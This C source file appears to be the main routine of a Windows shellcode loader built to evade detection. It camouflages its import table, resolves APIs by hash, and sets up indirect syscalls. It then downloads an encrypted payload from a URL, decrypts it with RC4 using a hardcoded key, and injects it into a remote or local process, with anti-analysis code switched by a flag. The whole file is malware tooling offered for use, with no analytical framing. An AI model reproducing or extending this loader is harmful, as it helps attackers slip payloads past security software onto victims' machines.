#include <windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "IATCamo.h"
#include "Debug.h"




//
//
//  ALL THAT IS LEFT IS ANTI DEBUG AND ANALYSIS
//
//


// GETTING ERROR WITH NtAllocateVirtualMemory IN LOCAL INJECTION




unsigned char ProtectedKey[] = {
        0x8C, 0xA6, 0xDE, 0x60, 0x5C, 0x28, 0x08, 0x5A, 0x90, 0xA8, 0xAF, 0x6E, 0xB6, 0x91, 0x63, 0x81 };

//
//\
#define VANISH

//
#define LOCAL



extern API_HASHING g_Api;

float _fltused = 0;





int main() {

    PBYTE pBytes = 0;
    SIZE_T sBytesSize = 0;
    DWORD PID = 0;
    HANDLE hProcess = NULL;
    HMODULE hNTDLL = NULL;




    IatCamouflage();
#ifdef DEBUG
    PRINTA("Starting Get Module...\n\n");
#endif
    hNTDLL = GetMod(NTDLLDLL_DJB2);
    g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
    g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
    g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
    g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
    indirectMyAss(NtProtectVirtualMemory_DJB2, hNTDLL, &NtProtectVirtualMemorySSN, &NtProtectVirtualMemorySyscall);
    indirectMyAss(NtDelayExecution_JOAA, hNTDLL, &NtDelayExecutionSSN, &NtDelayExecutionSyscall);
    indirectMyAss(NtAllocateVirtualMemory_DJB2, hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    indirectMyAss(NtCreateThreadEx_DJB2, hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
    indirectMyAss(NtWriteVirtualMemory_DJB2, hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    indirectMyAss(NtWaitForSingleObject_DJB2, hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    indirectMyAss(NtClose_DJB2, hNTDLL, &NtCloseSSN, &NtCloseSyscall);
    indirectMyAss(NtOpenProcess_DJB2, hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
    indirectMyAss(NtQuerySystemInformation_DJB2, hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);


#ifdef VANISH

    if (!AntiAnalysis()) {
        
    }

#endif

#ifdef DEBUG
    PRINTA("getting payload from url...\n")
#endif 
    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
        return -1;
    }

#ifdef DEBUG
    PRINTA("Decrypting...\n");
#endif 
    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, pBytes, KEY_SIZE, sBytesSize)) {
        return NULL;
    }
#ifdef DEBUG
    PRINTA("DONE!!\n");
#endif 


#ifndef LOCAL
#ifdef DEBUG
    PRINTA("running GetRemoteProcessHandle...\n\n");
#endif 
    if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
        return -1;
    }



    if (!injectMyAss(hProcess, PID, pBytes, sBytesSize)) {
        return -1;
    }
#endif

#ifdef LOCAL
    if (!LocalInjection((HANDLE)-1, pBytes, sBytesSize)) {
        return -1;
    }
#endif


    return 0;
}